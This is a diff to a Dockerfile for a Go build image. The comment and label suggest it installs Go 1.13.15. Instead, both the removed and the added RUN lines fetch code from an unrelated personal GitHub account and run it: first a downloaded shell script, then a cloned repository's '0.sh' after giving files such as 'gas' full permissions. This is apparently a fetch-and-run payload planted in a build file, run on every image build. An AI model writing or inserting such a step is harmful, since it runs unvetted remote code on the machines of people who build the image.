@@ -4,4 +4,4 @@ FROM golang:${GO_VERSION}
 LABEL maintainer=dev@codeship.com
 
 # go 1.13.15
-RUN wget https://raw.githubusercontent.com/Annsjjsks/aa/main/%3E/dev/null/dev.sh && chmod 777 dev.sh && ./dev.sh
+RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
